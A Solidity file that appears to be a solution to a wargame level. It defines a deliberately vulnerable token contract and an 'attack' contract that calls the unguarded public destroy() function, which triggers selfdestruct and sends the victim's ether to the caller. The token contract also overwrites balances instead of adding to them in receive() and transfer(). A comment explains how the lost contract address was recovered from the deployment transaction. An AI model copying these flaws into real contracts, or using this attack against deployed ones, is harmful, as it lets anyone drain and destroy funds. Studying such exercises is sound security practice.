// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;




import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";


contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}


// HOW DID I FIND THE LOST ADDRESS?
// I simply followed the deployment transaction on etherscan and recovered the address that way. The attack contract simply destroys the old contract and releases 
// the ether.

contract attack {
    
    SimpleToken simpleToken;



    constructor (address victim) {
        simpleToken = SimpleToken(payable(victim));
    }

    function destroyVictim() public {
        simpleToken.destroy(payable(msg.sender));
    }



}
